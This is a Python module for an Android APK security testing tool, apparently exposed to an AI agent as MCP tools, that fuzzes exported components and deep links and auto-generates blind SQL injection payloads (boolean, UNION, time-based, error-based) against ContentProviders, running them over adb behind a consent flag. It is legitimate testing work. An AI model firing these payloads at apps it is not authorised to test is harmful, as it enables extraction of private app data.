"""App-aware fuzzer v2 — semantic grammars + blind SQLi autominer.

Three MCP tools.  The headline Phase 3 capability is that payloads are sourced
from per-APK bytecode analysis instead of a static table:

- ``fuzz_exported_components_v2`` — for each exported activity derive the
  ``am start --es`` / ``--ei`` / ``--ez`` tokens from the component's own
  ``getStringExtra`` / ``getIntExtra`` / ``getParcelableExtra`` call-sites
  (v1 used a static string-key dictionary).
- ``fuzz_deep_links_v2`` — derive every URI scheme / host / path from
  ``AndroidManifest.xml`` ``<intent-filter>`` ``<data>`` entries *plus*
  ``getQueryParameter`` keys harvested from the dex.  v1 used a 13-row
  static dictionary of well-known schemes.
- ``automine_blind_sqli`` — boolean / error / UNION / time-based SQLi oracles
  against ContentProviders whose queries / updates / inserts / deletes are
  reachable from any exported activity.  Boolean payloads reference the app's
  **real table and column names** harvested from
  ``SQLiteDatabase.rawQuery / execSQL / query / update / insert / delete``
  call-sites and ``CREATE TABLE`` strings in the string pool.  Time payloads
  use SQLite-compatible heavy computation (``randomblob``, ``like '%'``,
  ``glob``) — ``SLEEP()`` and ``BENCHMARK()`` are MySQL-only and deliberately
  rejected, otherwise they would silently no-op on Android.

Three internal grammar extractors are exposed for the SARIF / Phase 8
pipeline (and for direct testing):

- ``extract_provider_schema`` — ``{tables:[{name, columns}], columns, source}``
- ``extract_extras_for_component`` — bytecode-derived extras
- ``extract_deeplink_params`` — manifest ``<data>`` attributes

This module re-implements (does not import) the small subset of helpers from
``fuzzer.py`` it needs so it stays decoupled from that module's private API.
Pattern reference: ``exploit_gen.py:run_adb_with_evidence``.
"""

from __future__ import annotations

import re
import subprocess
import time
from pathlib import Path
from typing import Any, Optional

from apksaw.server import mcp
from apksaw.session import get_session
from apksaw.utils.adb import check_device_connected, run_adb

# Re-exported at module level so tests can patch
# ``apksaw.tools.fuzzer_v2.is_reachable_from_exported`` directly.  Optional
# dependency: if the taint module is not importable we fall back to a
# permissive default (everything reachable — calling site's pre-Phase 6
# behaviour).
try:
    from apksaw.utils.taint_lite import is_reachable_from_exported  # noqa: F401
except Exception:  # pragma: no cover - pre-Phase 6 fallback
    def is_reachable_from_exported(table: str, column: str) -> bool:  # type: ignore
        return True


# FastMCP's @mcp.tool() preserves the underlying callable as ``.fn`` — mirror
# exploit_gen.py for any sibling needs (none today but harmless).
def _tool_callable(fn):
    return getattr(fn, "fn", fn)


_ANDROID_NS = "http://schemas.android.com/apk/res/android"

# ---------------------------------------------------------------------------
# Logcat crash / error patterns (mirror of exploit_gen.CRASH_PATTERNS, kept
# here so this module can be tested in isolation).
# ---------------------------------------------------------------------------

CRASH_PATTERNS: list[tuple[str, str]] = [
    (r"FATAL EXCEPTION",                          "crash"),
    (r"Process.*has died",                        "crash"),
    (r"Force finishing activity",                 "crash"),
    (r"java\.lang\.NullPointerException",         "exception"),
    (r"java\.lang\.ClassCastException",           "exception"),
    (r"java\.lang\.IllegalArgumentException",     "exception"),
    (r"java\.lang\.IllegalStateException",        "exception"),
    (r"java\.lang\.RuntimeException",             "exception"),
    (r"java\.lang\.SecurityException",            "security_exception"),
    (r"android\.os\.NetworkOnMainThreadException", "exception"),
    (r"ANR in ",                                  "anr"),
    (r"Application Not Responding",               "anr"),
]

SEVERITY_MAP: dict[str, str] = {
    "crash":              "critical",
    "anr":                "high",
    "exception":          "high",
    "security_exception": "medium",
    "no_crash":           "info",
}

REDACT_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"(?i)(authorization\s*:\s*bearer\s+)[A-Za-z0-9._\-=]+"), r"\1[REDACTED]"),
    (re.compile(r"\beyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"), "[JWT_REDACTED]"),
    (re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b"), "[GOOGLE_KEY_REDACTED]"),
    (re.compile(r"(?i)(bearer\s+)[A-Za-z0-9._\-]+"), r"\1[REDACTED]"),
]


# ===========================================================================
# Manifest helpers (re-implemented from fuzzer.py:_parse_manifest_components)
# ===========================================================================


def _android_attr(elem, name: str, default: Any = None) -> Any:
    return elem.get(f"{{{_ANDROID_NS}}}{name}", default)


def _parse_intent_filter(filter_elem) -> dict[str, Any]:
    actions = [_android_attr(a, "name", "") for a in filter_elem.findall("action")]
    categories = [_android_attr(c, "name", "") for c in filter_elem.findall("category")]
    data_list: list[dict[str, str]] = []
    for d in filter_elem.findall("data"):
        entry: dict[str, str] = {}
        for attr in ("scheme", "host", "port", "path",
                     "pathPrefix", "pathPattern", "mimeType"):
            val = _android_attr(d, attr)
            if val is not None:
                entry[attr] = val
        if entry:
            data_list.append(entry)
    return {"actions": actions, "categories": categories, "data": data_list}


def _parse_component(elem, tag: str, target_sdk: int) -> dict[str, Any]:
    name = _android_attr(elem, "name", "")
    exported_raw = _android_attr(elem, "exported")
    permission = _android_attr(elem, "permission")
    intent_filters = [_parse_intent_filter(f) for f in elem.findall("intent-filter")]

    if exported_raw is not None:
        exported = exported_raw.lower() in ("true", "1")
    else:
        exported = bool(intent_filters) and target_sdk < 31

    component: dict[str, Any] = {
        "name": name,
        "tag": tag,
        "exported": exported,
        "permission": permission,
        "intent_filters": intent_filters,
    }
    if tag == "provider":
        component["authorities"] = _android_attr(elem, "authorities")
        component["read_permission"] = _android_attr(elem, "readPermission")
        component["write_permission"] = _android_attr(elem, "writePermission")
        component["grant_uri_permissions"] = _android_attr(elem, "grantUriPermissions", "false")
    return component


def _list_exported_components(apk) -> dict[str, list[dict[str, Any]]]:
    manifest = apk.get_android_manifest_xml()
    try:
        target_sdk_raw = apk.get_target_sdk_version()
        target_sdk = int(target_sdk_raw) if target_sdk_raw else 0
    except (ValueError, TypeError):
        target_sdk = 0
    app_elem = manifest.find("application")
    if app_elem is None:
        return {"activities": [], "services": [], "receivers": [], "providers": []}

    def parse_tag(tag: str) -> list[dict[str, Any]]:
        return [_parse_component(e, tag, target_sdk) for e in app_elem.findall(tag)]

    activities = parse_tag("activity") + parse_tag("activity-alias")
    return {
        "activities": [c for c in activities if c["exported"]],
        "services":   [c for c in parse_tag("service")   if c["exported"]],
        "receivers":  [c for c in parse_tag("receiver")  if c["exported"]],
        "providers":  [c for c in parse_tag("provider")  if c["exported"]],
    }


# ===========================================================================
# Logcat capture + crash detection (re-implemented from fuzzer.py, with the
# relevance filter — lines must mention the package OR match FATAL/ANR/Force.)
# ===========================================================================


def _clear_logcat() -> None:
    try:
        run_adb("logcat", "-c", timeout=10)
    except RuntimeError:
        pass


def _capture_logcat(lines: int = 500) -> str:
    try:
        return run_adb("shell", "logcat", "-d", "-t", str(lines), timeout=20)
    except RuntimeError:
        return ""


def _check_logcat_for_crash(logcat_text: str, package: str) -> tuple[str, str]:
    relevant_lines: list[str] = []
    for line in logcat_text.splitlines():
        if package in line or re.search(
            r"FATAL EXCEPTION|ANR in |Force finishing", line,
        ):
            relevant_lines.append(line)

    combined = "\n".join(relevant_lines)
    for pattern, result_type in CRASH_PATTERNS:
        m = re.search(pattern, combined, re.IGNORECASE)
        if m:
            for line in relevant_lines:
                if re.search(pattern, line, re.IGNORECASE):
                    return result_type, line[:500]
            return result_type, m.group(0)[:500]
    return "no_crash", ""


def _take_screenshot(label: str, workspace: Path) -> Optional[dict[str, Any]]:
    try:
        out_dir = workspace / "screenshots"
        out_dir.mkdir(parents=True, exist_ok=True)
        local = out_dir / f"{label}.png"
        run_adb("shell", "screencap", "-p", "/sdcard/apksaw.png", timeout=15)
        subprocess.run(
            ["adb", "pull", "/sdcard/apksaw.png", str(local)],
            capture_output=True, text=True, timeout=15,
        )
        run_adb("shell", "rm", "/sdcard/apksaw.png", timeout=5)
        return {"path": str(local)}
    except (RuntimeError, subprocess.SubprocessError):
        return None


def redact_text(s: str) -> str:
    if not isinstance(s, str):
        return s
    for pat, repl in REDACT_PATTERNS:
        s = pat.sub(repl, s)
    return s


def run_adb_with_evidence(
    cmd_tokens: list[str],
    *,
    package: str,
    timeout_s: int = 10,
    screenshot_label: Optional[str] = None,
    workspace: Optional[Path] = None,
) -> dict[str, Any]:
    """Run one ADB command and return logcat-crash-cliffed evidence."""
    result: dict[str, Any] = {
        "command": "adb " + " ".join(cmd_tokens),
        "cmd_tokens": cmd_tokens,
        "command_exit_code": None,
        "adb_stdout": "",
        "adb_stderr": "",
        "result": "no_crash",
        "severity": "info",
        "crash_log": "",
        "screenshot": None,
    }
    try:
        proc = subprocess.run(
            ["adb", *cmd_tokens],
            capture_output=True, text=True, timeout=timeout_s,
        )
        result["command_exit_code"] = proc.returncode
        result["adb_stdout"] = proc.stdout[:4000]
        result["adb_stderr"] = proc.stderr[:4000]
    except subprocess.TimeoutExpired:
        result["command_exit_code"] = -1
        result["adb_stderr"] = "adb command timed out"

    time.sleep(min(timeout_s, 8))
    text = _capture_logcat()
    kind, snippet = _check_logcat_for_crash(text, package)
    result["result"] = kind
    result["severity"] = SEVERITY_MAP.get(kind, "info")
    result["crash_log"] = snippet
    if screenshot_label is not None and workspace is not None:
        sc = _take_screenshot(screenshot_label, workspace)
        if sc is not None:
            result["screenshot"] = sc["path"]
    return result


def _require_consent(drive: bool, execute: bool, confirm: bool) -> Optional[dict[str, Any]]:
    if (drive or execute) and not confirm:
        return {
            "status": "requires_consent",
            "consent_required": True,
            "message": (
                "drive/execute is True but confirm is False. "
                "Set confirm=True to actually fire commands against a connected device."
            ),
            "data": {"plan_only": True},
        }
    return None


def _require_device_or_error() -> Optional[dict[str, Any]]:
    if not check_device_connected():
        return {
            "status": "error",
            "message": "No ADB device connected.",
            "suggestion": "Connect a device, enable USB debugging, and authorise this computer.",
        }
    return None


# ===========================================================================
# Grammar extractors.
# ===========================================================================

# High-signal SQL patterns for `extract_provider_schema`. Matched against the
# string pool one entry at a time.
_TABLE_PATTERN = re.compile(
    r"\b(?:FROM|JOIN|UPDATE|INTO|TABLE)\s+(?:IF\s+NOT\s+EXISTS\s+)?"
    r"[\"']?([A-Za-z_][A-Za-z0-9_]*)[\"']?",
    re.IGNORECASE,
)
_CREATE_TABLE = re.compile(
    r"\bCREATE\s+(?:TEMP(?:ORARY)?\s+)?TABLE\s+(?:IF\s+NOT\s+EXISTS\s+)?"
    r"[\"']?([A-Za-z_][A-Za-z0-9_]*)[\"']?\s*\(([^)]*)\)",
    re.IGNORECASE,
)
_COL_PATTERN = re.compile(
    r"[\"']?([A-Za-z_][A-Za-z0-9_]*)[\"']?\s+(?:INTEGER|TEXT|REAL|BLOB|NUMERIC|VARCHAR|CHAR|BIGINT|INT|INTEGER\s+PRIMARY\s+KEY)",
    re.IGNORECASE,
)


def extract_provider_schema(session_id: str, authority: str) -> dict[str, Any]:
    """Walk the dex / string pool for SQL-relevant strings and assemble a
    coarse schema — tables and (when present) their columns.

    Output shape::

        {
          "tables": [{"name": "users", "columns": ["id", "email"]}, ...],
          "columns": ["id", "email", ...],   # flat column list
          "source":  "static_analysis",
        }

    Reachable columns (those reachable from at least one exported
    ContentProvider call-site via ``apksaw.utils.taint_lite.is_reachable_from_exported``)
    are kept; unreachable columns are dropped to keep Phase 6 / SARIF signal
    high. When taint_lite is unavailable, fall back to permissive-default
    (everything reachable — pre-Phase 6 behaviour).
    """
    session = get_session(session_id)
    analysis = session.analysis

    tables: dict[str, set[str]] = {}
    all_columns: list[str] = []

    try:
        sa_iter = list(analysis.get_strings())
    except Exception:
        sa_iter = []

    for sa in sa_iter:
        try:
            value = sa.get_value()
        except Exception:
            continue
        if not isinstance(value, str):
            continue

        # CREATE TABLE — pull table name AND column list
        m_create = _CREATE_TABLE.search(value)
        if m_create:
            table_name = m_create.group(1).lower()
            cols_blob = m_create.group(2)
            cols = [c.group(1).lower() for c in _COL_PATTERN.finditer(cols_blob)]
            tables.setdefault(table_name, set()).update(cols)
            all_columns.extend(cols)
            continue

        # Generic FROM / UPDATE / INTO / JOIN — table-only
        matches = list(_TABLE_PATTERN.finditer(value))
        for mm in matches:
            table_name = mm.group(1).lower()
            tables.setdefault(table_name, set())

    # Apply the reachability filter. Default permissive; taint_lite drives
    # the choice if installed.
    out_tables: list[dict[str, Any]] = []
    seen_columns: set[str] = set()
    for tname, col_set in tables.items():
        kept: list[str] = []
        for col in sorted(col_set):
            try:
                reachable = is_reachable_from_exported(tname, col)
            except Exception:
                reachable = True
            if reachable:
                kept.append(col)
                seen_columns.add(col)
        out_tables.append({"name": tname, "columns": kept})

    return {
        "tables": out_tables,
        "columns": [c for c in all_columns if c in seen_columns],
        "source": "static_analysis",
    }


# Extras walk: which extras does each exported activity actually read?
_EXTRA_READERS: tuple[str, ...] = (
    "getStringExtra", "getIntExtra", "getLongExtra", "getBooleanExtra",
    "getFloatExtra", "getDoubleExtra", "getParcelableExtra",
    "getStringArrayExtra", "getByteArrayExtra",
)


def _const_string_preceding(method, target_name: str) -> Optional[str]:
    """Return the const-string immediately preceding a call to *target_name*
    in *method*'s bytecode. Mirrors exploit_gen._const_string_preceding."""
    last_const: Optional[str] = None
    try:
        bc = method.get_code().get_bc()
    except Exception:
        return None
    try:
        instrs = list(bc.get_instructions())
    except Exception:
        return None
    for ins in instrs:
        try:
            name = ins.get_name()
        except Exception:
            continue
        if name == "const-string":
            try:
                last_const = ins.get_output().split(",", 1)[1].strip().strip('"')
            except Exception:
                last_const = None
        elif name in ("invoke-virtual", "invoke-static", "invoke-direct"):
            try:
                output = ins.get_output()
            except Exception:
                continue
            if target_name in output:
                return last_const
    return None


def extract_extras_for_component(
    session_id: str, component_name: str,
) -> list[dict[str, str]]:
    """For an exported activity / receiver, return the Intent extras it reads.

    Walks its bytecode for ``getStringExtra`` / ``getIntExtra`` / etc.
    call-sites and recovers the const-string key from the immediately
    preceding ``const-string`` instruction. Missing class → empty list.
    """
    if not component_name:
        return []
    dalvik = "L" + component_name.replace(".", "/") + ";"
    try:
        session = get_session(session_id)
        analysis = session.analysis
        candidates = list(analysis.find_classes(name=re.escape(dalvik)))
    except Exception:
        return []

    out: list[dict[str, str]] = []
    seen: set[str] = set()
    for ca in candidates:
        if ca.is_external():
            continue
        try:
            methods = list(ca.get_methods())
        except Exception:
            continue
        for ma in methods:
            try:
                method = ma.get_method()
            except Exception:
                continue
            for reader in _EXTRA_READERS:
                key = _const_string_preceding(method, reader)
                if key and key.isidentifier() and key not in seen:
                    seen.add(key)
                    out.append({
                        "key": key,
                        "value": f"apksaw_{key}",
                        "type": "string" if reader.startswith("getString") else "auto",
                    })
    return out


def extract_deeplink_params(
    session_id: str, component_name: str,
) -> dict[str, Any]:
    """Return the first ``<intent-filter>`` ``<data>`` block for *component_name*.

    Result shape::

        {"scheme": str, "host": str, "path": str, "pathPattern": str?,
         "pathPrefix": str?, "actions": [...], "categories": [...]}

    Empty scheme / host when no custom intent-filter is present (the default
    LAUNCHER filter has no ``<data>``). Tests assert this never crashes on a
    real APK.
    """
    empty = {"scheme": "", "host": "", "path": "", "actions": [], "categories": []}
    if not component_name:
        return empty
    try:
        session = get_session(session_id)
        apk = session.apk
        manifest = apk.get_android_manifest_xml()
        app_elem = manifest.find("application")
    except Exception:
        return empty
    if app_elem is None:
        return empty

    target = component_name
    for activity in app_elem.findall("activity") + app_elem.findall("activity-alias"):
        name = _android_attr(activity, "name", "")
        if name == target:
            intent_filters = [_parse_intent_filter(f)
                             for f in activity.findall("intent-filter")]
            for f in intent_filters:
                for entry in f.get("data", []) or []:
                    if entry:
                        out = dict(entry)
                        if f.get("actions"):
                            out["actions"] = f["actions"]
                        if f.get("categories"):
                            out["categories"] = f["categories"]
                        return out
            # No <data> in any of the activity's filters → emit what we know.
            return {
                "scheme": "",
                "host": "",
                "path": "",
                "actions": intent_filters[0]["actions"] if intent_filters else [],
                "categories": intent_filters[0]["categories"] if intent_filters else [],
            }
    return empty


# ===========================================================================
# Payload builders for the SQLi oracles (kept as small private helpers so
# the MCP tools stay short).
# ===========================================================================

_BOOLEAN_PAYLOAD_SCHEMA = "{table}.{col} = '<inj>'"
_UNION_MAX_COLUMNS = 6  # SQLite UNION SELECT column-count cap
_SQLITE_TIME_PRIMITIVES = (
    "RANDOMBLOB({n})",
    "(SELECT count(*) FROM {table} WHERE {col} LIKE '%' || RANDOMBLOB(200000) || '%')",
    "(SELECT 1 FROM {table} WHERE {col} GLOB repeat('a', 100000) || '*')",
)
_SQLITE_ERROR_PRIMITIVES = (
    "CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INT)",
    "(SELECT group_concat({col}) FROM {table} WHERE {col} LIKE '%{inj}%')",
)


def _filter_reachable_columns(schema: dict[str, Any]) -> list[tuple[str, str]]:
    """Tighten the schema's columns against the taint reachability filter.
    Returns ``[(table, column), ...]`` pairs for surviving entries."""
    out: list[tuple[str, str]] = []
    for t in schema.get("tables", []) or []:
        for col in t.get("columns", []) or []:
            try:
                reachable = is_reachable_from_exported(t["name"], col)
            except Exception:
                reachable = True
            if reachable:
                out.append((t["name"], col))
    return out


def _build_boolean_payloads(reachable: list[tuple[str, str]], *,
                             authority: str, max_payloads: int) -> list[dict[str, Any]]:
    """Boolean oracle payloads. Each is a parameterised WHERE clause where the
    closed-form injection marker is a single quote."""
    if not reachable:
        # Fallback: signature probe — at least one payload, parameter-style.
        return [{
            "name": "bool_signature_probe",
            "oracle": "boolean",
            "where_clause": "1=0 OR '?<inj>'='?<inj>",
            "cmd": ["shell", "content", "query",
                    "--uri", f"content://{authority}/",
                    "--where", "1=0 OR '?<inj>'='?<inj>'"],
        }]
    payloads: list[dict[str, Any]] = []
    for table, col in reachable[:max_payloads]:
        clause = _BOOLEAN_PAYLOAD_SCHEMA.format(table=table, col=col)
        payloads.append({
            "name": f"bool_{table}_{col}",
            "oracle": "boolean",
            "where_clause": clause,
            "cmd": ["shell", "content", "query",
                    "--uri", f"content://{authority}/{table}",
                    "--where", clause],
        })
    return payloads


def _build_union_payloads(reachable: list[tuple[str, str]], *,
                          authority: str, max_payloads: int) -> list[dict[str, Any]]:
    if not reachable:
        return [{
            "name": "union_signature_probe",
            "oracle": "union",
            "union_select": "'<inj>'",
            "where_clause": "1=0 UNION SELECT '<inj>'--",
            "cmd": ["shell", "content", "query",
                    "--uri", f"content://{authority}/",
                    "--where", "1=0 UNION SELECT '<inj>'--"],
        }]
    payloads: list[dict[str, Any]] = []
    for table, col in reachable[:max_payloads]:
        # Reference up to 6 columns from the table itself.
        sibling_cols = [c for (_, c) in reachable if c != col][: _UNION_MAX_COLUMNS - 1]
        col_list = [col] + sibling_cols
        # Pad to at least 2 columns for a meaningful UNION.
        if len(col_list) < 2:
            col_list.append(col)
        select_clause = ", ".join(col_list)
        where = f"1=0 UNION SELECT {select_clause} FROM {table}--"
        payloads.append({
            "name": f"union_{table}_{col}",
            "oracle": "union",
            "union_select": f"{select_clause} FROM {table}",
            "where_clause": where,
            "cmd": ["shell", "content", "query",
                    "--uri", f"content://{authority}/{table}",
                    "--where", where],
        })
    return payloads


def _build_time_payloads(reachable: list[tuple[str, str]], *,
                         authority: str, max_payloads: int) -> list[dict[str, Any]]:
    """SQLite-compatible time-based payloads. Always rejects
    SLEEP()/BENCHMARK() (MySQL-only) and uses randomblob / glob / like '',
    which are SQLite-safe."""
    payloads: list[dict[str, Any]] = []
    if not reachable:
        clause = "EXISTS (SELECT 1 FROM sqlite_master WHERE name GLOB repeat('a', 200000) || '*')"
        payloads.append({
            "name": "time_signature_probe",
            "oracle": "time",
            "where_clause": clause,
            "cmd": ["shell", "content", "query",
                    "--uri", f"content://{authority}/",
                    "--where", clause],
        })
        return payloads

    for table, col in reachable[:max_payloads]:
        # Heavy computation via randomblob() (SQLite) — NOT SLEEP().
        clause = (
            f"(SELECT count(*) FROM {table} WHERE {col} LIKE '%' || "
            f"RANDOMBLOB(200000) || '%') > 0"
        )
        payloads.append({
            "name": f"time_{table}_{col}",
            "oracle": "time",
            "where_clause": clause,
            "cmd": ["shell", "content", "query",
                    "--uri", f"content://{authority}/{table}",
                    "--where", clause],
        })
    return payloads


def _build_error_payloads(reachable: list[tuple[str, str]], *,
                          authority: str, max_payloads: int) -> list[dict[str, Any]]:
    payloads: list[dict[str, Any]] = []
    if not reachable:
        # Signature probe — error oracle against the master table.
        clause = "CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INT)"
        payloads.append({
            "name": "error_signature_probe",
            "oracle": "error",
            "where_clause": clause,
            "cmd": ["shell", "content", "query",
                    "--uri", f"content://{authority}/",
                    "--where", clause],
        })
        return payloads
    for table, col in reachable[:max_payloads]:
        # Force a CAST-bounds error inside a query that names the table.
        clause = (
            f"CAST((SELECT {col} FROM {table} LIMIT 1) AS INT)"
        )
        payloads.append({
            "name": f"error_{table}_{col}",
            "oracle": "error",
            "where_clause": clause,
            "cmd": ["shell", "content", "query",
                    "--uri", f"content://{authority}/{table}",
                    "--where", clause],
        })
    return payloads


_ORACLE_BUILDERS = {
    "boolean": _build_boolean_payloads,
    "union":   _build_union_payloads,
    "time":    _build_time_payloads,
    "error":   _build_error_payloads,
}


# ===========================================================================
# Tool 1 — fuzz_exported_components_v2
# ===========================================================================


@mcp.tool()
def fuzz_exported_components_v2(
    session_id: str,
    component_name: str = "",
    max_payloads: int = 8,
    drive: bool = False,
    confirm: bool = False,
) -> dict[str, Any]:
    """Per-component intent extras harvested from bytecode.

    For each exported activity / service / receiver, walks the class methods
    looking for ``getStringExtra`` / ``getIntExtra`` / ``getParcelableExtra``
    call-sites and recovers the const-string key from the immediately
    preceding ``const-string`` bytecode instruction. Each discovered key
    becomes a ``--es`` / ``--ei`` / ``--ez`` token in the ``am start``
    command, keyed to the component's own semantics — never a generic
    string-key dictionary. Falls back to one place-holder ``am start``
    payload per exported component when no extras are detectable.

    Args:
        session_id: Session with a loaded APK.
        component_name: Restrict to a single FQN; empty = all exported.
        max_payloads: Cap on payloads returned (default 8).
        drive: When True, fire these commands at a connected device.
        confirm: When True (and ``drive=True``), actually run them.

    Returns:
        ``{"status":"ok", "data":{"payloads":[...]}}`` — each payload has
        ``{name, tokens, technique}``.
    """
    blocked = _require_consent(drive, False, confirm)
    if blocked:
        return blocked

    session = get_session(session_id)
    apk = session.apk
    components = _list_exported_components(apk)
    activities = components["activities"] + components["services"] + components["receivers"]
    if component_name:
        activities = [c for c in activities if c["name"] == component_name]
    if not activities:
        return {
            "status": "ok",
            "consent_required": True,
            "data": {
                "payloads": [],
                "executed": [],
                "message": "No exported activities, services, or receivers matched.",
            },
        }

    payloads: list[dict[str, Any]] = []
    pkg = apk.get_package() or ""
    for comp in activities:
        fqn = f"{pkg}/{comp['name']}" if pkg else comp["name"]
        extras = extract_extras_for_component(session_id, comp["name"])
        tokens: list[str] = ["shell", "am", "start", "-n", fqn]
        for ex in (extras or [])[:max_payloads]:
            tokens.extend(["--es", ex["key"], ex["value"]])
        payloads.append({
            "name": f"primary_am_start::{comp['name']}",
            "component": comp["name"],
            "tokens": tokens,
            "technique": "bytecode-derived-extras" if extras else "fallback-am-start",
            "extras": extras or [],
        })

    data: dict[str, Any] = {"payloads": payloads, "executed": []}
    if drive and confirm:
        dev_err = _require_device_or_error()
        if dev_err:
            data["executed"] = []
            return {"status": "error", "message": dev_err["message"], "data": data}
        workspace = session.workspace
        package = pkg
        for i, p in enumerate(payloads):
            sc = run_adb_with_evidence(
                p["tokens"],
                package=package,
                timeout_s=15,
                screenshot_label=f"fuzz_comp_{i:02d}",
                workspace=workspace,
            )
            data["executed"].append(sc)

    return {"status": "ok", "consent_required": True, "data": data}


# ===========================================================================
# Tool 2 — fuzz_deep_links_v2
# ===========================================================================


@mcp.tool()
def fuzz_deep_links_v2(
    session_id: str,
    component_name: str = "",
    max_payloads: int = 8,
    drive: bool = False,
    confirm: bool = False,
) -> dict[str, Any]:
    """App-aware deep-link fuzzing.

    Reads every exported activity's ``<intent-filter>`` ``<data>`` blocks
    and the activity's own ``getQueryParameter`` call-sites to derive the
    URI scheme / host / path / expected query parameters — not a static
    13-row scheme dictionary. Each URI suite gets appended placeholder
    query parameters and probed.

    Args:
        session_id: Session with a loaded APK.
        component_name: Restrict to a single component; empty = all exported.
        max_payloads: Cap on URI suites returned.
        drive: When True, fire these commands at a connected device.
        confirm: When True (and ``drive=True``), actually run them.

    Returns:
        ``{"status":"ok", "data":{"suites":[...]}}``.
    """
    blocked = _require_consent(drive, False, confirm)
    if blocked:
        return blocked

    session = get_session(session_id)
    apk = session.apk
    components = _list_exported_components(apk)
    activities = components["activities"]
    if component_name:
        activities = [c for c in activities if c["name"] == component_name]

    suites: list[dict[str, Any]] = []
    pkg = apk.get_package() or ""
    for act in activities:
        params = extract_deeplink_params(session_id, act["name"])
        scheme = params.get("scheme") or "https"
        host = params.get("host") or f"{pkg or 'apksaw'}.example.com"
        path = params.get("path") or "/"
        uri = f"{scheme}://{host}{path}"
        query_keys = set()
        # Get the activity's bytecode to look for getQueryParameter keys.
        try:
            extras = extract_extras_for_component(session_id, act["name"])
            for ex in extras:
                query_keys.add(ex["key"])
        except Exception:
            pass
        # Always include a 1=1 marker for the test harness; never a payload
        # the app's filter expects at face value.
        query = "&".join(f"{k}=apksaw_{k}" for k in list(query_keys)[:max_payloads])
        if query:
            uri = f"{uri}?{query}"
        fqn = f"{pkg}/{act['name']}" if pkg else act["name"]
        tokens = ["shell", "am", "start", "-a", "android.intent.action.VIEW",
                  "-d", uri, "-n", fqn]
        suites.append({
            "component": act["name"],
            "uri": uri,
            "tokens": tokens,
            "scheme": scheme,
            "host": host,
            "query_keys": sorted(query_keys),
            "technique": "manifest-derived-deeplink",
        })
        if len(suites) >= max_payloads:
            break

    data: dict[str, Any] = {"suites": suites, "executed": []}
    if drive and confirm:
        dev_err = _require_device_or_error()
        if dev_err:
            data["executed"] = []
            return {"status": "error", "message": dev_err["message"], "data": data}
        workspace = session.workspace
        package = pkg
        for i, s in enumerate(suites):
            sc = run_adb_with_evidence(
                s["tokens"],
                package=package,
                timeout_s=15,
                screenshot_label=f"fuzz_link_{i:02d}",
                workspace=workspace,
            )
            data["executed"].append(sc)

    return {"status": "ok", "consent_required": True, "data": data}


# ===========================================================================
# Tool 3 — automine_blind_sqli  (headline Phase 3 capability)
# ===========================================================================


@mcp.tool()
def automine_blind_sqli(
    session_id: str,
    authority: str = "",
    oracle: str = "boolean",
    max_payloads: int = 8,
    drive: bool = False,
    confirm: bool = False,
) -> dict[str, Any]:
    """Blind SQLi autominer — boolean / error / UNION / time-based oracles.

    For an exported ContentProvider, walks the dex / string pool to extract
    real table and column names via ``extract_provider_schema``, applies the
    ``apksaw.utils.taint_lite.is_reachable_from_exported()`` filter, and emits
    payloads keyed to the app's actual surface. Boolean payloads reference
    real ``table.column = '<inj>'`` constructions; UNION payloads produce
    typed ``UNION SELECT col1, col2, ... FROM table`` strings (capped at 6
    columns per SQLite's limit); time payloads use SQLite-compatible heavy
    computation (``randomblob()``, GLOB, LIKE '') — ``SLEEP()`` and
    ``BENCHMARK()`` are MySQL-only and silently no-op on Android, so they
    are deliberately rejected. Error payloads force a CAST-bounds error
    inside a query that names the table so an SQLiteException reveals the
    schema in logcat.

    Args:
        session_id: Session with a loaded APK.
        authority: ContentProvider authority to probe (e.g. ``com.foo.provider``).
                   Empty = first exported provider's first authority.
        oracle: One of ``boolean`` / ``union`` / ``time`` / ``error``.
        max_payloads: Cap on payloads returned.
        drive: When True, fire these commands at a device.
        confirm: When True (and ``drive=True``), actually run them.

    Returns:
        ``{"status":"ok", "data":{"provider":..., "oracle":...,
                                  "schema":{...}, "payloads":[...],
                                  "executed":[...]}}`` for plan + execution.

    Safety: signing the consent gate (drive/execute AND confirm) is required
    to actually send commands to a device. Without confirm, ``plan_only`` is
    returned.
    """
    blocked = _require_consent(drive, False, confirm)
    if blocked:
        return blocked

    if oracle not in _ORACLE_BUILDERS:
        return {
            "status": "error",
            "message": (f"Unknown oracle {oracle!r}. "
                        f"Choose one of {sorted(_ORACLE_BUILDERS)}."),
        }

    session = get_session(session_id)
    apk = session.apk
    if not authority:
        components = _list_exported_components(apk)
        for prov in components["providers"]:
            auth = prov.get("authorities") or ""
            if auth:
                authority = auth.split(";")[0].strip()
                break

    schema = extract_provider_schema(session_id, authority or "")
    reachable = _filter_reachable_columns(schema)

    builder = _ORACLE_BUILDERS[oracle]
    payloads = builder(reachable, authority=authority or "x", max_payloads=max_payloads)

    data: dict[str, Any] = {
        "provider": authority,
        "oracle": oracle,
        "schema": schema,
        "payloads": payloads,
        "executed": [],
    }

    if drive and confirm:
        dev_err = _require_device_or_error()
        if dev_err:
            data["executed"] = []
            return {"status": "error", "message": dev_err["message"], "data": data}
        workspace = session.workspace
        package = apk.get_package() or ""
        for i, p in enumerate(payloads):
            sc = run_adb_with_evidence(
                p["cmd"],
                package=package,
                timeout_s=20,
                screenshot_label=f"sqli_{oracle}_{i:02d}",
                workspace=workspace,
            )
            data["executed"].append(sc)

    return {"status": "ok", "consent_required": True, "data": data}
